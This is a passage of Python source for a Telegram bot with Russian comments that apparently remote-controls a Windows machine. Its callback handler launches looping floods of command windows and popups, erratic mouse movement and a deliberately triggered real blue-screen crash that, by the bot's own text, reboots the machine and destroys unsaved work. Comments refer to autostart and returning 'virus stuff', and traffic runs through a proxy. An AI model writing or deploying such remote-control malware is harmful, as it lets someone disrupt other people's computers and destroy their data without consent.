                                   reply_markup=pranks_kb(), parse_mode="HTML")

    elif data in CAT_KBS:
        title, mk = CAT_KBS[data]
        await cb.message.edit_text(title, reply_markup=mk())

    elif data == "joke":
        emoji, joke = random.choice(JOKES)
        await ctx.bot.send_message(chat_id, f"{emoji} <blockquote>{html.escape(joke)}</blockquote>", parse_mode="HTML")

    # --- зацикленные приколы (со стоп-кнопкой) ---
    elif data in ("floodcmd", "floodpop", "flooddrunk"):
        if uid in flood_stop:
            flood_stop.discard(uid)
        title = LOOP_TITLES[data]
        task_map = {
            "floodcmd": prank_flood_task, "floodpop": popup_bomb_task,
            "flooddrunk": mouse_drunk_task,
        }
        await cb.message.edit_text(f"{title} летит, пока не тапнешь ⛔", parse_mode="HTML")
        asyncio.create_task(task_map[data](uid, chat_id))
        await ctx.bot.send_message(chat_id, f"{title} в разгаре…",
                                   reply_markup=kb([("⛔ Стоп", "stopflood")], [("⬅️ Меню", "main")]))

    elif data == "stopflood":
        flood_stop.add(uid)
        await cb.message.edit_text("🧹 безумие остановлено (странные окна снимите руками)")
        await send_menu(chat_id, ctx)

    elif data == "vr_bsod":
        await cb.message.edit_text(
            "💀 <b>БСОД НАСТОЯЩИЙ</b>\nкраш через 2 секунды — машина уйдёт в перезагрузку,\n"
            "несохранённое сгорит, бот замолчит до конца ребута.\n"
            "после ребута всё чисто (♻️ автозапуск решает, вернётся ли вирусня)",
            parse_mode="HTML")
        threading.Thread(target=v_bsod_bg, daemon=True).start()

    elif data in THREAD_PRANKS:
        await run_thread_prank(cb, ctx, chat_id, data)

    elif data == "cancel":
        pending.pop(uid, None)
        await cb.message.edit_text("🧹 сброшено")
        await send_menu(chat_id, ctx)

async def on_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    chat_id = update.effective_chat.id
    # панель сразу, без отдельного экрана выбора: хост уже в шапке,
    # смена хоста — кнопкой 🛰 внутри ЭТОЙ ЖЕ панели
    SESS.setdefault(chat_id, host_label())
    await send_menu(chat_id, ctx)

async def on_err(update, ctx):
    logging.exception("глюк на %s", update)

def _acquire_bot_lock():
    """один пульт на машину: вторая копия сразу же закрывается,
    иначе Telegram кидает 409 Conflict и обе копии глючат."""
    try:
        import msvcrt
        DATA_DIR.mkdir(exist_ok=True)
        fh = open(DATA_DIR / "bot.lock", "a+")
        try:
            msvcrt.locking(fh.fileno(), msvcrt.LK_NBLCK, 1)
        except OSError:
            fh.close()
            return None
        try:
            fh.write(str(os.getpid()))
        except Exception:
            pass
        return fh
    except Exception:
        return open(os.devnull, "w")   # некритично: без блокировки всё равно живём

def main():
    lockfh = _acquire_bot_lock()
    if lockfh is None:
        logging.error("пульт уже запущен в другом окне — эта копия не пускается (bot.lock занят)")
        try:
            print("пульт уже работает. эту копию закрываю; пользуйся работой первого окна.")
        except Exception:
            pass
        time.sleep(2.0)
        return
    from telegram.request import HTTPXRequest
    req = HTTPXRequest(connect_timeout=30, read_timeout=90, write_timeout=300, proxy=PROXY_URL)
    req_updates = HTTPXRequest(connect_timeout=30, read_timeout=90, write_timeout=90, proxy=PROXY_URL)
    app = (Application.builder()
           .token(BOT_TOKEN)
           .request(req)                   # socks5 — весь трафик через прокси
           .get_updates_request(req_updates)
           .build())
    app.add_handler(CommandHandler(["start", "menu"], on_start))
    app.add_handler(CallbackQueryHandler(cb_tap))
    app.add_handler(MessageHandler(filters.TEXT, on_text))
    app.add_handler(MessageHandler(filters.PHOTO, save_photo_and_wallpaper))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_error_handler(on_err)
    logging.info("бот в работе (прокси: %s)", bool(PROXY_URL))
    app.run_polling(bootstrap_retries=-1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        s = str(e)
        if "Conflict" in s or "terminated" in s:
            print("токен занят другой копией пульта (Telegram 409).\n"
                  "один токен = один работающий пульт. второй пусть для других машин получит свой токен у BotFather.")
        else:
            raise
